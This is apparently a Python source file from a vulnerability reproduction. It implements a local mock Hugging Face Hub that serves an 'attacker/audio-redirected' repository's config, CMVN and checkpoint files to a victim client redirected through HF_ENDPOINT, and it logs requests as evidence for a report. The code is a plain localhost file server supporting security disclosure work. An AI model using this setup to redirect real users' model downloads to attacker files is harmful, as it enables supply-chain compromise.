"""Minimal local stand-in for the Hugging Face Hub.

The victim's huggingface_hub client is pointed at this endpoint via HF_ENDPOINT
(a supported configuration for self-hosted hubs). It serves exactly one
repository id, `attacker/audio-redirected`, from a local directory, so the
"second repository" in the reproduction is this server. Every request is
logged to stdout and to /work/poc/logs/hf_mock.log with a timestamp, which is
what the report's network evidence is taken from.

Only the three data files named by vita/model/multimodal_encoder/builder.py
are served: train.yaml, global_cmvn, final.pt. No Python, no plugins.
"""
import datetime
import hashlib
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = "127.0.0.1"
PORT = 8000
REPO_DIR = "/work/poc/attacker_repo"
LOG_DIR = "/work/poc/logs"
ATTACKER_REPO = "attacker/audio-redirected"
FAKE_COMMIT = "3e1f4d2c00000000000000000000000000000000"

os.makedirs(LOG_DIR, exist_ok=True)
LOG_PATH = os.path.join(LOG_DIR, "hf_mock.log")


def log(line):
    stamped = f"{datetime.datetime.now().isoformat(timespec='seconds')} {line}"
    print(stamped, flush=True)
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(stamped + "\n")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send(self, code, body=b"", content_type="application/octet-stream", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        extra = dict(extra or {})
        if "Content-Length" not in extra:
            self.send_header("Content-Length", str(len(body)))
        for key, value in extra.items():
            self.send_header(key, value)
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _resolve_path(self):
        # /<repo id>/resolve/<revision>/<filename>
        parts = self.path.lstrip("/").split("?")[0].split("/")
        if len(parts) >= 5 and parts[2] == "resolve":
            repo = "/".join(parts[:2])
            filename = "/".join(parts[4:])
            return repo, filename
        return None, None

    def _serve_file(self, method):
        repo, filename = self._resolve_path()
        if repo == ATTACKER_REPO and filename:
            local = os.path.join(REPO_DIR, filename)
            if os.path.isfile(local):
                with open(local, "rb") as f:
                    body = f.read()
                # real hubs use content-addressed etags; a per-file etag keeps
                # huggingface_hub's blob cache from aliasing different files
                etag = hashlib.sha256(body).hexdigest()[:32]
                log(f"HIT  200 {method} /{repo}/resolve/main/{filename} bytes={len(body)}")
                self._send(
                    200,
                    body if method == "GET" else b"",
                    extra={
                        "ETag": f'"{etag}"',
                        "X-Repo-Commit": FAKE_COMMIT,
                        "Content-Length": str(len(body)),
                        "Accept-Ranges": "bytes",
                    },
                )
                return True
        return False

    def do_HEAD(self):
        if not self._serve_file("HEAD"):
            log(f"MISS 404 HEAD {self.path}")
            self._send(404, b"", "text/plain")

    def do_GET(self):
        if self._serve_file("GET"):
            return
        if self.path.startswith("/api/"):
            log(f"HIT  200 GET  {self.path} (api stub)")
            self._send(200, b'{"id": "attacker/audio-redirected"}', "application/json")
            return
        log(f"MISS 404 GET  {self.path}")
        self._send(404, b"not found", "text/plain")

    def log_message(self, *args):  # requests are logged by the handler itself
        pass


if __name__ == "__main__":
    log(f"mock HF hub listening on http://{HOST}:{PORT} "
        f"serving repo '{ATTACKER_REPO}' from {REPO_DIR}")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
